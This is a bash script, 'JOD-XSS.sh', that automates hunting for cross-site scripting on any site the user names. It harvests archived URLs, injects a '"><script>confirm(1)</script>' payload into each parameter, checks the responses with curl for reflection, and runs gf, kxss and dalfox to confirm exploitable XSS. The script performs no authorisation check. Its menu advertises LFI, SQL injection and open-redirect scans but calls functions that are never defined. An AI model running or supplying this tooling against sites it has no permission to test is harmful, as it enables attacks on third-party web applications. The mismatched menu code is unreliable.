#!/bin/bash
#title:         JOD-XSS.sh
#description:   Automated and Modular Shell Script to Automate Security Vulnerability Scans
#author:        R12W4N, xentr0, Raviakp1004
#version:       1.6.1
#==============================================================================
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
RESET=`tput sgr0`
WBOLD=`tput bold 7`
WUL=`tput smul`

function trap_ctrlc ()
{
    echo "Ctrl-C caught...performing clean up"

    echo "Doing cleanup"
    trap "kill 0" EXIT
    exit 2
}

trap "trap_ctrlc" 2 

banner(){
    echo '
    
     ██╗ ██████╗ ██████╗      ██╗  ██╗███████╗███████╗
     ██║██╔═══██╗██╔══██╗     ╚██╗██╔╝██╔════╝██╔════╝
     ██║██║   ██║██║  ██║█████╗╚███╔╝ ███████╗███████╗
██   ██║██║   ██║██║  ██║╚════╝██╔██╗ ╚════██║╚════██║
╚█████╔╝╚██████╔╝██████╔╝     ██╔╝ ██╗███████║███████║
 ╚════╝  ╚═════╝ ╚═════╝      ╚═╝  ╚═╝╚══════╝╚══════╝
        '
}
####Add Functions Here

parametercrawler(){
    echo -e
    read -p "${RED}URL: ${RESET}" URL && echo -e
    #read -p 'Add Custom Parameter like source= ' cparam
    #read -p 'BXSS Hunter URL; xss.ht' bxss

    ##waybackurl
    echo -e
    waybackurls $URL > $project/$project-all-urls.log
    echo "[${GREEN}I${RESET}] Done with Waybackurls${RESET}"
    
    #Stripping
    echo -e
    cat $project/$project-all-urls.log | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" > $project/uniqueparam.txt && echo -e uniqueparam.txt >> $project/tmplist
    echo "[${GREEN}I${RESET}]Extracted URL with Valid Parameters${RESET}"
}

dpayloadinjector(){
    ##dpayload
    cat $project/uniqueparam.txt | qsinject -i '"><script>confirm(1)</script>' -iu -decode > $project/qsinject.txt && echo qsinject.txt >> $project/tmplist
    echo -e
    echo "[${RED}+${RESET}] ${GREEN}Waybackurl Output file > qsinject > running with default payload...${RESET}"
    echo -e
    echo "${CYAN}${WUL}curl --silent --path-as-is --insecure [eachline] | grep -qs '<script>confirm(1) && echo Vulnerable [each-line] && echo [each-line] >> $project/xss-poc-2.txt${RESET}"

    file="$project/qsinject.txt"
    while IFS= read line
        do
            curl --silent --path-as-is --insecure "$line" | grep -qs "<script>confirm(1)" && echo ${RED}Vulnerable${RESET} $line && echo "$line" >> $project/xss-poc-2.txt
        done <"$file" 
}

XSSURLSCAN(){
        
    cat $project/uniqueparam.txt | gf xss > $project/gfxss.txt && echo -e gfxss.txt >> $project/tmplist
    cat $project/uniqueparam.txt | /root/go/bin/kxss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u > $project/kxss.txt && echo kxss.txt >> $project/tmplist
    
    echo -e
    echo "${MAGENTA}Total Count...${RESET}"
    echo -n "$project-all-urls.log.txt : " & cat $project/$project-all-urls.log | wc -l
    echo -n "uniqueparam.txt : " & cat $project/uniqueparam.txt | wc -l 
    echo -n "qsinject.txt : " & cat $project/qsinject.txt | wc -l
    echo -n "gfxss.txt : " & cat $project/gfxss.txt | wc -l
    echo -n "kxss.txt : " & cat $project/kxss.txt | wc -l
    
    echo -e
    echo "${RED}Choose which results to run with dalfox...${RESET}"
    select d in $(<$project/tmplist);
    do test -n "$d" && break; 
    echo ">>> Invalid Selection"; 
    done
    firstv=$d
    echo -e
    echo "Filename: ${BLUE}$project/$firstv ${RESET}" && cat $project/$firstv
    echo "${BLUE}Piping Dalfox on $project/$firstv! ${RESET}"
    echo -e
    echo "${CYAN}${WUL}cat $project/$firstv | dalfox pipe --output $project/xss-poc.txt${RESET}"
    
    #running here
    echo -e
    cat $project/$firstv | dalfox pipe --output $project/xss-poc.txt
    echo -e
    echo "${MAGENTA}>>>>JOOOOOOOODDDDDDDDDDD!!!!!<<<< ${RESET}"
}


#Menu options
options[0]="Run XSS Scan on Single URL"
options[1]="Scan for LFI using GF Patterns"
options[2]="Run SQL Injection Scan"
options[3]="Check for Open Redirect"
options[4]="Advance Vulnerability Scan"

#Variables
ERROR=" "

#Clear screen for menu
clear

#Menu function
function MENU {
    echo "Menu Options"
    for NUM in ${!options[@]}; do
        echo "[""${choices[NUM]:- }""]" $(( NUM+1 ))") ${options[NUM]}"
    done
    echo "$ERROR"
}

JOD_XSS(){
    parametercrawler 
    dpayloadinjector
    XSSURLSCAN
}

#Menu loop
while MENU && read -e -p "Select the desired options using their number (again to uncheck, ENTER when done): " -n1 SELECTION && [[ -n "$SELECTION" ]]; do
    clear
    if [[ "$SELECTION" == *[[:digit:]]* && $SELECTION -ge 1 && $SELECTION -le ${#options[@]} ]]; then
        (( SELECTION-- ))
        if [[ "${choices[SELECTION]}" == "+" ]]; then
            choices[SELECTION]=""
        else
            choices[SELECTION]="+"
        fi
            ERROR=" "
    else
        ERROR="Invalid option: $SELECTION"
    fi
done

#Actions to take based on selection
function ACTIONS {
    if [[ ${choices[0]} ]]; then
        #Option 1 selected
        echo "Option 1 selected; Need a Single URL"
	    JOD_XSS
    fi
    if [[ ${choices[1]} ]]; then
        #Option 2 selected
        echo "Option 2 selected; Scanning for LFI using GF Patterns"
	    LFI
    fi
    if [[ ${choices[2]} ]]; then
        #Option 2 selected
        echo "Option 3 selected"
        nmap4
    fi
    if [[ ${choices[3]} ]]; then
        #Option 2 selected
        echo "Option 4 selected"
        rustscan1
    fi
}

projectdirectorycheck(){
    read -p "${RED}Project Name: ${RESET}" project
    echo $project

    if [ -d $project ]
    then
        echo -e
        echo -e "[${RED}I${RESET}] $project Directory already exists...${RESET}"
    else
        mkdir -p $project
    fi
}

banner
projectdirectorycheck
ACTIONS
